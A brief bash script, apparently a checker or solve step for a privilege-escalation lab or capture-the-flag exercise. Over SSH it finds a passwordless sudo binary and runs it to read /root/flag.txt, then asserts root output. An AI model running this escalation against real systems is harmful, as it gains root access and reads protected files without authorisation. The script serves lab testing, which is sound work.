#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'BIN=$(sudo -l 2>/dev/null | awk "/NOPASSWD/ {print \$NF; exit}"); sudo -n "$BIN" -R . /root/flag.txt | tr -d \"\"')"
assert_root_output "${out}"
